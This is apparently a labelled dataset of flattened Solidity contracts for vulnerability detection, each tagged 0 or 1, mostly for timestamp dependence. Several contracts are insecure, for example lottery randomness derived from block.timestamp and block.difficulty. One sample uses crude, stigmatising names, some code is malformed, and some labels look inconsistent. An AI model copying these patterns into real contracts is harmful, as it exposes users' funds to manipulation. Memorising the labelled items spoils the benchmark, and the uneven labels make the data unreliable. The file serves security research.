1<CODESPLIT>contract Brothel {    mapping(address => bool) public hasAids;    Ho[8] public hoes;    struct Ho {        uint aidsChance;    }    function rentHo(uint index) public payable {        Ho hoe = hoes[index];        if (block.timestamp % hoe.aidsChance == 0) {            hasAids[msg.sender] = true;        }        return;    }}
1<CODESPLIT>contract WorkIt is ERC20Interface {     string public constant name = "WorkIt Token";  string public constant symbol = "WIT";  uint _totalSupply = 0;  mapping(address => uint) balances;  mapping(address => mapping(address => uint)) allowances;  function totalSupply() public constant returns (uint) {    return _totalSupply;  }  function balanceOf(address tokenOwner) public constant returns (uint balance) {    return balances[tokenOwner];  }  function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {    return allowances[tokenOwner][spender];  }  function transfer(address to, uint tokens) public returns (bool success) {    require(balances[msg.sender] >= tokens);    balances[msg.sender] = balances[msg.sender] - tokens;    balances[to] = balances[to] + tokens;    emit Transfer(msg.sender, to, tokens);    return true;  }  function approve(address spender, uint tokens) public returns (bool success) {    allowances[msg.sender][spender] = tokens;    emit Approval(msg.sender, spender, tokens);    return true;  }  function transferFrom(address from, address to, uint tokens) public returns (bool success) {    require(allowances[from][msg.sender] >= tokens);    require(balances[from] >= tokens);    allowances[from][msg.sender] = allowances[from][msg.sender] - tokens;    balances[from] = balances[from] - tokens;    balances[to] = balances[to] + tokens;    emit Transfer(from, to, tokens);    return true;  }     struct WeekCommittment {    uint daysCompleted;    uint daysCommitted;    mapping(uint => uint) workoutProofs;    uint tokensCommitted;    uint tokensEarned;    bool tokensPaid;  }  struct WeekData {    bool initialized;    uint totalPeopleCompleted;    uint totalPeople;    uint totalDaysCommitted;    uint totalDaysCompleted;    uint totalTokensCompleted;    uint totalTokens;  }  uint public weiPerToken = 1000000000000000;    uint secondsPerDay = 86400;  uint daysPerWeek = 7;  mapping(uint => WeekData) public dataPerWeek;  mapping (address => mapping(uint => WeekCommittment)) public commitments;  mapping(uint => string) imageHashes;  uint imageHashCount;  uint public startDate;  address public owner;  constructor() public {    owner = msg.sender;         startDate = (block.timestamp / secondsPerDay) * secondsPerDay - 60 * 6;  }  event Log(string message);     function () public payable {    buyTokens(msg.value / weiPerToken);  }     function buyTokens(uint tokens) public payable {    require(msg.value >= tokens * weiPerToken);    balances[msg.sender] += tokens;    _totalSupply += tokens;  }     function commitToWeek(uint tokens, uint _days) public {         if (balances[msg.sender] < tokens || tokens < 10) {      emit Log("You need to bet at least 10 tokens to commit");      require(false);    }    if (_days == 0) {      emit Log("You cannot register for 0 days of activity");      require(false);    }    if (_days > daysPerWeek) {      emit Log("You cannot register for more than 7 days per week");      require(false);    }    if (_days > daysPerWeek - currentDayOfWeek()) {      emit Log("It is too late in the week for you to register");      require(false);    }    WeekCommittment storage commitment = commitments[msg.sender][currentWeek()];    if (commitment.tokensCommitted != 0) {      emit Log("You have already committed to this week");      require(false);    }    balances[0x0] = balances[0x0] + tokens;    balances[msg.sender] = balances[msg.sender] - tokens;    emit Transfer(msg.sender, 0x0, tokens);    initializeWeekData(currentWeek());    WeekData storage data = dataPerWeek[currentWeek()];    data.totalPeople++;    data.totalTokens += tokens;    data.totalDaysCommitted += _days;    commitment.daysCommitted = _days;    commitment.daysCompleted = 0;    commitment.tokensCommitted = tokens;    commitment.tokensEarned = 0;    commitment.tokensPaid = false;  }     function payout() public {    require(currentWeek() > 0);    for (uint activeWeek = currentWeek() - 1; true; activeWeek--) {      WeekCommittment storage committment = commitments[msg.sender][activeWeek];      if (committment.tokensPaid) {        break;      }      if (committment.daysCommitted == 0) {        committment.tokensPaid = true;                 if (activeWeek == 0) break;        continue;      }      initializeWeekData(activeWeek);      WeekData storage week = dataPerWeek[activeWeek];      uint tokensFromPool = 0;      uint tokens = committment.tokensCommitted * committment.daysCompleted / committment.daysCommitted;      if (week.totalPeopleCompleted == 0) {        tokensFromPool = (week.totalTokens - week.totalTokensCompleted) / week.totalPeople;        tokens = 0;      } else if (committment.daysCompleted == committment.daysCommitted) {        tokensFromPool = (week.totalTokens - week.totalTokensCompleted) / week.totalPeopleCompleted;      }      uint totalTokens = tokensFromPool + tokens;      if (totalTokens == 0) {        committment.tokensPaid = true;                 if (activeWeek == 0) break;        continue;      }      balances[0x0] = balances[0x0] - totalTokens;      balances[msg.sender] = balances[msg.sender] + totalTokens;      emit Transfer(0x0, msg.sender, totalTokens);      committment.tokensEarned = totalTokens;      committment.tokensPaid = true;             if (activeWeek == 0) break;    }  }        function postProof(string proofHash) public {    WeekCommittment storage committment = commitments[msg.sender][currentWeek()];    if (committment.daysCompleted > currentDayOfWeek()) {      emit Log("You have already uploaded proof for today");      require(false);    }    if (committment.tokensCommitted == 0) {      emit Log("You have not committed to this week yet");      require(false);    }    if (committment.workoutProofs[currentDayOfWeek()] != 0) {      emit Log("Proof has already been stored for this day");      require(false);    }    if (committment.daysCompleted >= committment.daysCommitted) {             return;    }    committment.workoutProofs[currentDayOfWeek()] = storeImageString(proofHash);    committment.daysCompleted++;    initializeWeekData(currentWeek());    WeekData storage week = dataPerWeek[currentWeek()];    week.totalDaysCompleted++;    week.totalTokensCompleted = week.totalTokens * week.totalDaysCompleted / week.totalDaysCommitted;    if (committment.daysCompleted >= committment.daysCommitted) {      week.totalPeopleCompleted++;    }  }     function withdraw(uint tokens) public returns (bool success) {    require(balances[msg.sender] >= tokens);    uint weiToSend = tokens * weiPerToken;    require(address(this).balance >= weiToSend);    balances[msg.sender] = balances[msg.sender] - tokens;    _totalSupply -= tokens;    return msg.sender.send(tokens * weiPerToken);  }     function storeImageString(string hash) public returns (uint index) {    imageHashes[++imageHashCount] = hash;    return imageHashCount;  }     function initializeWeekData(uint _week) public {    if (dataPerWeek[_week].initialized) return;    WeekData storage week = dataPerWeek[_week];    week.initialized = true;    week.totalTokensCompleted = 0;    week.totalPeopleCompleted = 0;    week.totalTokens = 0;    week.totalPeople = 0;    week.totalDaysCommitted = 0;    week.totalDaysCompleted = 0;  }     function currentDay() public view returns (uint day) {    return (block.timestamp - startDate) / secondsPerDay;  }     function currentWeek() public view returns (uint week) {    return currentDay() / daysPerWeek;  }     function currentDayOfWeek() public view returns (uint dayIndex) {         return currentDay() - (currentWeek() * daysPerWeek);  }}
0<CODESPLIT>contract DogCoreInterface {        function getDog(uint256 _id) external view returns (        uint256 cooldownIndex,        uint256 nextActionAt,        uint256 siringWithId,        uint256 birthTime,        uint256 matronId,        uint256 sireId,        uint256 generation,        uint256 genes,        uint8 variation,        uint256 gen0        );     function sendMoney(address _to, uint256 _money) external;        function cfoAddress() public returns(address);    function cooAddress() public returns(address);        function getAvailableBlance() external view returns(uint256);}
0<CODESPLIT>contract LotteryInterface {        function isLottery() public pure returns (bool);        function getCLottery()         public         view         returns (            uint8[7]        luckyGenes1,            uint256         totalAmount1,            uint256         openBlock1,            bool            isReward1,            uint256         term1,            uint8           currentGenes1,            uint256         tSupply,            uint256         sPoolAmount1,            uint256[]       reward1        );}
1<CODESPLIT>contract ExpiringMarket {    function getTime() constant returns (uint) {        return block.timestamp;    }}
0<CODESPLIT>contract LotteryBase {        uint8 public currentGene;        uint256 public lastBlockNumber;        uint256 randomSeed = 1;    struct CLottery {                uint8[7]        luckyGenes;                uint256         totalAmount;                uint256         openBlock;                bool            isReward;                bool         noFirstReward;    }        CLottery[] public CLotteries;        address public finalLottery;        uint256 public SpoolAmount = 0;        DogCoreInterface public dogCore;        event OpenLottery(uint8 currentGene, uint8 luckyGenes, uint256 currentTerm, uint256 blockNumber, uint256 totalAmount);        event OpenCarousel(uint256 luckyGenes, uint256 currentTerm, uint256 blockNumber, uint256 totalAmount);            modifier onlyCEO() {        require(msg.sender == dogCore.ceoAddress());        _;      }        modifier onlyCFO() {        require(msg.sender == dogCore.cfoAddress());        _;      }        function toLotteryPool(uint amount) public onlyCFO {        require(SpoolAmount >= amount);        SpoolAmount -= amount;    }        function _isCarousal(uint256 currentTerm) external view returns(bool) {       return (currentTerm > 1 && CLotteries[currentTerm - 2].noFirstReward && CLotteries[currentTerm - 1].noFirstReward);     }        function getCurrentTerm() external view returns (uint256) {        return (CLotteries.length - 1);    }}
0<CODESPLIT>contract LotteryGenes is LotteryBase {        function convertGeneArray(uint256 gene) public pure returns(uint8[7]) {        uint8[28] memory geneArray;         uint8[7] memory lotteryArray;        uint index = 0;        for (index = 0; index < 28; index++) {            uint256 geneItem = gene % (2 ** (5 * (index + 1)));            geneItem /= (2 ** (5 * index));            geneArray[index] = uint8(geneItem);        }        for (index = 0; index < 7; index++) {            uint size = 4 * index;            lotteryArray[index] = geneArray[size];                    }        return lotteryArray;    }    function convertGene(uint8[7] luckyGenes) public pure returns(uint256) {        uint8[28] memory geneArray;        for (uint8 i = 0; i < 28; i++) {            if (i%4 == 0) {                geneArray[i] = luckyGenes[i/4];            } else {                geneArray[i] = 6;            }        }        uint256 gene = uint256(geneArray[0]);                for (uint8 index = 1; index < 28; index++) {            uint256 geneItem = uint256(geneArray[index]);            gene += geneItem << (index * 5);        }        return gene;    }}
1<CODESPLIT>contract SetLottery is LotteryGenes {    function random(uint8 seed) internal returns(uint8) {        randomSeed = block.timestamp;        return uint8(uint256(keccak256(randomSeed, block.difficulty))%seed)+1;    }    function openLottery(uint8 _viewId) public returns(uint8,uint8) {        uint8 viewId = _viewId;        require(viewId < 7);        uint256 currentTerm = CLotteries.length - 1;        CLottery storage clottery = CLotteries[currentTerm];        if (currentGene == 0 && clottery.openBlock > 0 && clottery.isReward == false) {            OpenLottery(viewId, clottery.luckyGenes[viewId], currentTerm, clottery.openBlock, clottery.totalAmount);            return (clottery.luckyGenes[viewId],1);        }        if (lastBlockNumber == block.number) {            OpenLottery(viewId, clottery.luckyGenes[viewId], currentTerm, clottery.openBlock, clottery.totalAmount);            return (clottery.luckyGenes[viewId],2);        }        if (currentGene == 0 && clottery.isReward == true) {            CLottery memory _clottery;            _clottery.luckyGenes = [0,0,0,0,0,0,0];            _clottery.totalAmount = uint256(0);            _clottery.isReward = false;            _clottery.openBlock = uint256(0);            currentTerm = CLotteries.push(_clottery) - 1;        }        if (this._isCarousal(currentTerm)) {            revert();        }        uint8 luckyNum = 0;                uint256 bonusBalance = dogCore.getAvailableBlance();        if (currentGene == 6) {            if (bonusBalance <= SpoolAmount) {                OpenLottery(viewId, clottery.luckyGenes[viewId], currentTerm, 0, 0);                return (clottery.luckyGenes[viewId],3);            }            luckyNum = random(8);            CLotteries[currentTerm].luckyGenes[currentGene] = luckyNum;            OpenLottery(currentGene, luckyNum, currentTerm, block.number, bonusBalance);            currentGene = 0;            CLotteries[currentTerm].openBlock = block.number;            CLotteries[currentTerm].totalAmount = bonusBalance;            lastBlockNumber = block.number;        } else {                     luckyNum = random(12);            CLotteries[currentTerm].luckyGenes[currentGene] = luckyNum;            OpenLottery(currentGene, luckyNum, currentTerm, 0, 0);            currentGene ++;            lastBlockNumber = block.number;        }        return (luckyNum,0);    }     function random2() internal view returns (uint256) {        return uint256(uint256(keccak256(block.timestamp, block.difficulty))%uint256(dogCore.totalSupply()) + 1);    }    function openCarousel() public {        uint256 currentTerm = CLotteries.length - 1;        CLottery storage clottery = CLotteries[currentTerm];        if (currentGene == 0 && clottery.openBlock > 0 && clottery.isReward == false) {            OpenCarousel(convertGene(clottery.luckyGenes), currentTerm, clottery.openBlock, clottery.totalAmount);        }        if (currentGene == 0 && clottery.openBlock > 0 && clottery.isReward == true) {            CLottery memory _clottery;            _clottery.luckyGenes = [0,0,0,0,0,0,0];            _clottery.totalAmount = uint256(0);            _clottery.isReward = false;            _clottery.openBlock = uint256(0);            currentTerm = CLotteries.push(_clottery) - 1;        }        uint256 bonusBlance = dogCore.getAvailableBlance();        require (this._isCarousal(currentTerm));        uint256 genes = _getValidRandomGenes();        require (genes > 0);        uint8[7] memory luckyGenes = convertGeneArray(genes);        OpenCarousel(genes, currentTerm, block.number, bonusBlance);        CLotteries[currentTerm].luckyGenes = luckyGenes;        CLotteries[currentTerm].openBlock = block.number;        CLotteries[currentTerm].totalAmount = bonusBlance;            }        function _getValidRandomGenes() internal view returns (uint256) {        uint256 luckyDog = random2();        uint256 genes = _validGenes(luckyDog);        uint256 totalSupply = dogCore.totalSupply();        if (genes > 0) {            return genes;        }          uint256 min = (luckyDog < totalSupply-luckyDog) ? (luckyDog - 1) : totalSupply-luckyDog;        for (uint256 i = 1; i < min + 1; i++) {            genes = _validGenes(luckyDog - i);            if (genes > 0) {                break;            }            genes = _validGenes(luckyDog + i);            if (genes > 0) {                    break;                }            }        if (genes == 0) {            if (min == luckyDog - 1) {                for (i = min + luckyDog; i < totalSupply + 1; i++) {                        genes = _validGenes(i);                        if (genes > 0) {                            break;                        }                    }                   }            if (min == totalSupply - luckyDog) {                for (i = min; i < luckyDog; i++) {                        genes = _validGenes(luckyDog - i - 1);                        if (genes > 0) {                            break;                        }                    }                   }            }        return genes;    }    function _validGenes(uint256 dogId) internal view returns (uint256) {        var(, , , , , ,generation, genes, variation,) = dogCore.getDog(dogId);        if (generation == 0 || dogCore.ownerOf(dogId) == finalLottery || variation > 0) {            return 0;        } else {            return genes;        }    }    }
0<CODESPLIT>contract LotteryCore is SetLottery {        function LotteryCore(address _ktAddress) public {        dogCore = DogCoreInterface(_ktAddress);        CLottery memory _clottery;        _clottery.luckyGenes = [0,0,0,0,0,0,0];        _clottery.totalAmount = uint256(0);        _clottery.isReward = false;        _clottery.openBlock = uint256(0);        CLotteries.push(_clottery);    }    function setFinalLotteryAddress(address _flAddress) public onlyCEO {        finalLottery = _flAddress;    }        function getCLottery()         public         view         returns (            uint8[7]        luckyGenes,            uint256         totalAmount,            uint256         openBlock,            bool            isReward,            uint256         term        ) {            term = CLotteries.length - uint256(1);            luckyGenes = CLotteries[term].luckyGenes;            totalAmount = CLotteries[term].totalAmount;            openBlock = CLotteries[term].openBlock;            isReward = CLotteries[term].isReward;    }    function rewardLottery(bool isMore) external {        require(msg.sender == finalLottery);        uint256 term = CLotteries.length - 1;        CLotteries[term].isReward = true;        CLotteries[term].noFirstReward = isMore;    }    function toSPool(uint amount) external {                require(msg.sender == finalLottery);        SpoolAmount += amount;    }}
0<CODESPLIT>contract FinalLottery {    bool public isLottery = true;    LotteryCore public lotteryCore;    DogCoreInterface public dogCore;    uint8[7] public luckyGenes;    uint256         totalAmount;    uint256         openBlock;    bool            isReward;    uint256         currentTerm;    uint256  public duration;    uint8   public  lotteryRatio;    uint8[7] public lotteryParam;    uint8   public  carousalRatio;    uint8[7] public carousalParam;         struct FLottery {        address[]        owners0;        uint256[]        dogs0;        address[]        owners1;        uint256[]        dogs1;        address[]        owners2;        uint256[]        dogs2;        address[]        owners3;        uint256[]        dogs3;        address[]        owners4;        uint256[]        dogs4;        address[]        owners5;        uint256[]        dogs5;        address[]        owners6;        uint256[]        dogs6;        uint256[]       reward;    }    mapping(uint256 => FLottery) flotteries;    function FinalLottery(address _lcAddress) public {        lotteryCore = LotteryCore(_lcAddress);        dogCore = DogCoreInterface(lotteryCore.dogCore());        duration = 11520;        lotteryRatio = 23;        lotteryParam = [46,16,10,9,8,6,5];        carousalRatio = 12;        carousalParam = [35,18,14,12,8,7,6];            }        event DistributeLottery(uint256[] rewardArray, uint256 currentTerm);        event RegisterLottery(uint256 dogId, address owner, uint8 lotteryClass, string result);        function setLotteryDuration(uint256 durationBlocks) public {        require(msg.sender == dogCore.ceoAddress());        require(durationBlocks > 140);        require(durationBlocks < block.number);        duration = durationBlocks;    }        function registerLottery(uint256 dogId) public returns (uint8) {        uint256 _dogId = dogId;        (luckyGenes, totalAmount, openBlock, isReward, currentTerm) = lotteryCore.getCLottery();        address owner = dogCore.ownerOf(_dogId);        require (owner != address(this));        require(address(dogCore) == msg.sender);        require(totalAmount > 0 && isReward == false && openBlock > (block.number-duration));        var(, , , birthTime, , ,generation,genes, variation,) = dogCore.getDog(_dogId);        require(birthTime < openBlock);        require(generation > 0);        require(variation == 0);        uint8 _lotteryClass = getLotteryClass(luckyGenes, genes);        require(_lotteryClass < 7);        address[] memory owners;        uint256[] memory dogs;         (dogs, owners) = _getLuckyList(currentTerm, _lotteryClass);                    for (uint i = 0; i < dogs.length; i++) {            if (_dogId == dogs[i]) {                RegisterLottery(_dogId, owner, _lotteryClass,"dog already registered");                 return 5;            }        }        _pushLuckyInfo(currentTerm, _lotteryClass, owner, _dogId);                RegisterLottery(_dogId, owner, _lotteryClass,"successful");        return 0;    }        function distributeLottery() public returns (uint8) {        (luckyGenes, totalAmount, openBlock, isReward, currentTerm) = lotteryCore.getCLottery();                require(openBlock > 0 && openBlock < (block.number-duration));        require(totalAmount >= lotteryCore.SpoolAmount());        if (isReward == true) {            DistributeLottery(flotteries[currentTerm].reward, currentTerm);            return 1;        }        uint256 legalAmount = totalAmount - lotteryCore.SpoolAmount();        uint256 totalDistribute = 0;        uint8[7] memory lR;        uint8 ratio;        if (lotteryCore._isCarousal(currentTerm) ) {            lR = carousalParam;            ratio = carousalRatio;        } else {            lR = lotteryParam;            ratio = lotteryRatio;        }        for (uint8 i = 0; i < 7; i++) {            address[] memory owners;            uint256[] memory dogs;            (dogs, owners) = _getLuckyList(currentTerm, i);            if (owners.length > 0) {                    uint256 reward = (legalAmount * ratio * lR[i])/(10000 * owners.length);                    totalDistribute += reward * owners.length;                    dogCore.sendMoney(dogCore.cfoAddress(),reward * owners.length/10);                                        for (uint j = 0; j < owners.length; j++) {                        address gen0Add;                        if (i == 0) {                            dogCore.sendMoney(owners[j],reward*95*9/1000);                            gen0Add = _getGen0Address(dogs[j]);                            if(gen0Add != address(0)){                                dogCore.sendMoney(gen0Add,reward*5/100);                            }                        } else if (i == 1) {                            dogCore.sendMoney(owners[j],reward*97*9/1000);                            gen0Add = _getGen0Address(dogs[j]);                            if(gen0Add != address(0)){                                dogCore.sendMoney(gen0Add,reward*3/100);                            }                        } else if (i == 2) {                            dogCore.sendMoney(owners[j],reward*98*9/1000);                            gen0Add = _getGen0Address(dogs[j]);                            if(gen0Add != address(0)){                                dogCore.sendMoney(gen0Add,reward*2/100);                            }                        } else {                            dogCore.sendMoney(owners[j],reward*9/10);                        }                    }                    flotteries[currentTerm].reward.push(reward);                 } else {                    flotteries[currentTerm].reward.push(0);                }         }        if (flotteries[currentTerm].owners0.length == 0) {            lotteryCore.toSPool((dogCore.getAvailableBlance() - lotteryCore.SpoolAmount())/20);            lotteryCore.rewardLottery(true);        } else {            lotteryCore.rewardLottery(false);        }                DistributeLottery(flotteries[currentTerm].reward, currentTerm);        return 0;    }    function _getGen0Address(uint256 dogId) internal view returns(address) {        var(, , , , , , , , , gen0) = dogCore.getDog(dogId);        return dogCore.getOwner(gen0);    }    function _getLuckyList(uint256 currentTerm1, uint8 lotclass) public view returns (uint256[] kts, address[] ons) {        if (lotclass==0) {            ons = flotteries[currentTerm1].owners0;            kts = flotteries[currentTerm1].dogs0;        } else if (lotclass==1) {            ons = flotteries[currentTerm1].owners1;            kts = flotteries[currentTerm1].dogs1;        } else if (lotclass==2) {            ons = flotteries[currentTerm1].owners2;            kts = flotteries[currentTerm1].dogs2;        } else if (lotclass==3) {            ons = flotteries[currentTerm1].owners3;            kts = flotteries[currentTerm1].dogs3;        } else if (lotclass==4) {            ons = flotteries[currentTerm1].owners4;            kts = flotteries[currentTerm1].dogs4;        } else if (lotclass==5) {            ons = flotteries[currentTerm1].owners5;            kts = flotteries[currentTerm1].dogs5;        } else if (lotclass==6) {            ons = flotteries[currentTerm1].owners6;            kts = flotteries[currentTerm1].dogs6;        }    }    function _pushLuckyInfo(uint256 currentTerm1, uint8 _lotteryClass, address owner, uint256 _dogId) internal {        if (_lotteryClass == 0) {            flotteries[currentTerm1].owners0.push(owner);            flotteries[currentTerm1].dogs0.push(_dogId);        } else if (_lotteryClass == 1) {            flotteries[currentTerm1].owners1.push(owner);            flotteries[currentTerm1].dogs1.push(_dogId);        } else if (_lotteryClass == 2) {            flotteries[currentTerm1].owners2.push(owner);            flotteries[currentTerm1].dogs2.push(_dogId);        } else if (_lotteryClass == 3) {            flotteries[currentTerm1].owners3.push(owner);            flotteries[currentTerm1].dogs3.push(_dogId);        } else if (_lotteryClass == 4) {            flotteries[currentTerm1].owners4.push(owner);            flotteries[currentTerm1].dogs4.push(_dogId);        } else if (_lotteryClass == 5) {            flotteries[currentTerm1].owners5.push(owner);            flotteries[currentTerm1].dogs5.push(_dogId);        } else if (_lotteryClass == 6) {            flotteries[currentTerm1].owners6.push(owner);            flotteries[currentTerm1].dogs6.push(_dogId);        }    }    function getLotteryClass(uint8[7] luckyGenesArray, uint256 genes) internal view returns(uint8) {        if (currentTerm < 0) {            return 100;        }                uint8[7] memory dogArray = lotteryCore.convertGeneArray(genes);        uint8 cnt = 0;        uint8 lnt = 0;        for (uint i = 0; i < 6; i++) {            if (luckyGenesArray[i] > 0 && luckyGenesArray[i] == dogArray[i]) {                cnt++;            }        }        if (luckyGenesArray[6] > 0 && luckyGenesArray[6] == dogArray[6]) {            lnt = 1;        }        uint8 lotclass = 100;        if (cnt==6 && lnt==1) {            lotclass = 0;        } else if (cnt==6 && lnt==0) {            lotclass = 1;        } else if (cnt==5 && lnt==1) {            lotclass = 2;        } else if (cnt==5 && lnt==0) {            lotclass = 3;        } else if (cnt==4 && lnt==1) {            lotclass = 4;        } else if (cnt==3 && lnt==1) {            lotclass = 5;        } else if (cnt==3 && lnt==0) {            lotclass = 6;        } else {            lotclass = 100;        }        return lotclass;    }        function checkLottery(uint256 genes) public view returns(uint8) {        var(luckyGenesArray, , , isReward1, ) = lotteryCore.getCLottery();        if (isReward1) {            return 100;        }        return getLotteryClass(luckyGenesArray, genes);    }        function getCLottery()         public         view         returns (            uint8[7]        luckyGenes1,            uint256         totalAmount1,            uint256         openBlock1,            bool            isReward1,            uint256         term1,            uint8           currentGenes1,            uint256         tSupply,            uint256         sPoolAmount1,            uint256[]       reward1        ) {            (luckyGenes1, totalAmount1, openBlock1, isReward1, term1) = lotteryCore.getCLottery();            currentGenes1 = lotteryCore.currentGene();            tSupply = dogCore.totalSupply();            sPoolAmount1 = lotteryCore.SpoolAmount();            reward1 = flotteries[term1].reward;    }    }
0<CODESPLIT>contract nix is Ownable, StandardToken {    string public constant symbol =  "NIX";    string public constantname =  "NIX";    uint256 public constant decimals = 18;        uint256 reserveTokensLockTime;    address reserveTokenAddress;    address public depositWalletAddress;    uint256 public weiRaised;    using SafeMath for uint256;        constructor() public {        owner = msg.sender;        depositWalletAddress = owner;        totalSupply_ = 500000000 ether;          balances[owner] = 150000000 ether;        emit Transfer(address(0),owner, balances[owner]);        reserveTokensLockTime = 182 days;          reserveTokenAddress = 0xf6c5dE9E1a6b36ABA36c6E6e86d500BcBA9CeC96;          balances[reserveTokenAddress] = 350000000 ether;        emit Transfer(address(0),reserveTokenAddress, balances[reserveTokenAddress]);    }         event Buy(address _from, uint256 _ethInWei, string userId);    function buy(string userId)public payable {        require(msg.value > 0);        require(msg.sender != address(0));        weiRaised += msg.value;        forwardFunds();        emit Buy(msg.sender, msg.value, userId);    }            function forwardFunds()internal {        depositWalletAddress.transfer(msg.value);    }    function changeDepositWalletAddress(address newDepositWalletAddr)public onlyOwner {        require(newDepositWalletAddr != 0);        depositWalletAddress = newDepositWalletAddr;    }    function transfer(address _to, uint256 _value) public reserveTokenLock returns (bool) {        super.transfer(_to,_value);    }    function transferFrom(address _from, address _to, uint256 _value) public reserveTokenLock returns (bool){        super.transferFrom(_from, _to, _value);    }    function approve(address _spender, uint256 _value) public reserveTokenLock returns (bool) {        super.approve(_spender, _value);    }    function increaseApproval(address _spender, uint _addedValue) public reserveTokenLock returns (bool) {        super.increaseApproval(_spender, _addedValue);    }    modifier reserveTokenLock () {        if(msg.sender == reserveTokenAddress){            require(block.timestamp > reserveTokensLockTime);            _;        }        else{            _;        }    }}
0<CODESPLIT>contract BITVesting {    uint256 public releaseDate;    function claim () external returns (bool success) {        require(block.timestamp > releaseDate);        selfdestruct(msg.sender);        return true;    }}
1<CODESPLIT>contract BirthdayGift {    address public recipient;    uint public birthday;    function Take () {        if (msg.sender != recipient) throw;        if (block.timestamp < birthday) throw;        if (!recipient.send (this.balance)) throw;        return;    }}
0<CODESPLIT>contract ArtNoyToken{  function setCrowdsaleContract (address) public;  function sendCrowdsaleTokens(address, uint256)  public;  function getOwner()public view returns(address);  function icoSucceed() public;  function endIco () public;} 
1<CODESPLIT>contract R1Exchange is SafeMath, Ownable {    mapping(address => bool) public admins;    mapping(address => bool) public feeAccounts;    bool public withdrawEnabled = false;    mapping(address => mapping(address => uint256)) public tokenList;    mapping(address => mapping(bytes32 => uint256)) public orderFilled;     mapping(bytes32 => bool) public withdrawn;    mapping(address => mapping(address => uint256)) public withdrawAllowance;    mapping(address => mapping(address => uint256)) public applyList;     mapping(address => mapping(address => uint)) public latestApply;     uint public applyWait = 7 days;    uint public feeRate = 1;    event Deposit(address indexed token, address indexed user, uint256 amount, uint256 balance);    event Withdraw(address indexed token, address indexed user, uint256 amount, uint256 balance);    event ApplyWithdraw(address indexed token, address indexed user, uint256 amount, uint256 time);    modifier onlyAdmin {        require(admins[msg.sender]);        _;    }    modifier isWithdrawEnabled {        require(withdrawEnabled);        _;    }    modifier isFeeAccount(address fa) {        require(feeAccounts[fa]);        _;    }    function() public {        revert();    }    function setAdmin(address admin, bool isAdmin) public onlyOwner {        require(admin != 0);        admins[admin] = isAdmin;    }    function setFeeAccount(address acc, bool asFee) public onlyOwner {        require(acc != 0);        feeAccounts[acc] = asFee;    }    function enableWithdraw(bool enabled) public onlyOwner {        withdrawEnabled = enabled;    }    function changeLockTime(uint lock) public onlyOwner {        require(lock <= 7 days);        applyWait = lock;    }    function changeFeeRate(uint fr) public onlyOwner {        require(fr > 0);        feeRate = fr;    }    function deposit() public payable {        tokenList[0][msg.sender] = safeAdd(tokenList[0][msg.sender], msg.value);        Deposit(0, msg.sender, msg.value, tokenList[0][msg.sender]);    }    function depositToken(address token, uint256 amount) public {        require(token != 0);        tokenList[token][msg.sender] = safeAdd(tokenList[token][msg.sender], amount);        require(Token(token).transferFrom(msg.sender, this, amount));        Deposit(token, msg.sender, amount, tokenList[token][msg.sender]);    }    function applyWithdraw(address token, uint256 amount) public {        uint256 apply = safeAdd(applyList[token][msg.sender], amount);        require(safeAdd(apply, withdrawAllowance[token][msg.sender]) <= tokenList[token][msg.sender]);        applyList[token][msg.sender] = apply;        latestApply[token][msg.sender] = block.timestamp;        ApplyWithdraw(token, msg.sender, amount, block.timestamp);    }         function approveWithdraw(address token, address user) public onlyAdmin {        withdrawAllowance[token][user] = safeAdd(withdrawAllowance[token][user], applyList[token][user]);        applyList[token][user] = 0;        latestApply[token][user] = 0;    }         function withdraw(address token, uint256 amount) public {        require(amount <= tokenList[token][msg.sender]);        if (amount > withdrawAllowance[token][msg.sender]) {                         require(latestApply[token][msg.sender] != 0 && safeSub(block.timestamp, latestApply[token][msg.sender]) > applyWait);            withdrawAllowance[token][msg.sender] = safeAdd(withdrawAllowance[token][msg.sender], applyList[token][msg.sender]);            applyList[token][msg.sender] = 0;        }        require(amount <= withdrawAllowance[token][msg.sender]);        withdrawAllowance[token][msg.sender] = safeSub(withdrawAllowance[token][msg.sender], amount);        tokenList[token][msg.sender] = safeSub(tokenList[token][msg.sender], amount);        latestApply[token][msg.sender] = 0;        if (token == 0) {             require(msg.sender.send(amount));        } else {             require(Token(token).transfer(msg.sender, amount));        }        Withdraw(token, msg.sender, amount, tokenList[token][msg.sender]);    }         function withdrawNoLimit(address token, uint256 amount) public isWithdrawEnabled {        require(amount <= tokenList[token][msg.sender]);        tokenList[token][msg.sender] = safeSub(tokenList[token][msg.sender], amount);        if (token == 0) {             require(msg.sender.send(amount));        } else {             require(Token(token).transfer(msg.sender, amount));        }        Withdraw(token, msg.sender, amount, tokenList[token][msg.sender]);    }         function adminWithdraw(address[3] addresses, uint256[3] values, uint8 v, bytes32 r, bytes32 s)    public    onlyAdmin    isFeeAccount(addresses[2])    {        address user = addresses[0];        address token = addresses[1];        address feeAccount = addresses[2];        uint256 amount = values[0];        uint256 nonce = values[1];        uint256 fee = values[2];        require(amount <= tokenList[token][user]);        require(safeMul(fee, feeRate) < amount);        bytes32 hash = keccak256(user, token, amount, nonce);        require(!withdrawn[hash]);        withdrawn[hash] = true;        require(ecrecover(keccak256("\x19Ethereum Signed Message:\n32", hash), v, r, s) == user);        tokenList[token][user] = safeSub(tokenList[token][user], amount);        tokenList[token][feeAccount] = safeAdd(tokenList[token][feeAccount], fee);        amount = safeSub(amount, fee);        if (token == 0) {             require(user.send(amount));        } else {             require(Token(token).transfer(user, amount));        }        Withdraw(token, user, amount, tokenList[token][user]);    }    function getOrderHash(address tokenBuy, uint256 amountBuy, address tokenSell, uint256 amountSell, address base, uint256 expires, uint256 nonce, address feeToken) public pure returns (bytes32) {        return keccak256(tokenBuy, amountBuy, tokenSell, amountSell, base, expires, nonce, feeToken);    }    function balanceOf(address token, address user) public constant returns (uint256) {        return tokenList[token][user];    }    struct Order {        address tokenBuy;        address tokenSell;        uint256 amountBuy;        uint256 amountSell;        address user;        uint256 fee;        uint256 expires;        uint256 nonce;        bytes32 orderHash;        address baseToken;        address feeToken;     }         function trade(        address[11] addresses,        uint256[11] values,        uint8[2] v,        bytes32[2] r,        bytes32[2] s    ) public    onlyAdmin    isFeeAccount(addresses[10])    {        Order memory makerOrder = Order({            tokenBuy : addresses[0],            tokenSell : addresses[2],            user : addresses[4],            amountBuy : values[0],            amountSell : values[2],            fee : values[4],            expires : values[6],            nonce : values[8],            orderHash : 0,            baseToken : addresses[6],            feeToken : addresses[8]            });        Order memory takerOrder = Order({            tokenBuy : addresses[1],            tokenSell : addresses[3],            user : addresses[5],            amountBuy : values[1],            amountSell : values[3],            fee : values[5],            expires : values[7],            nonce : 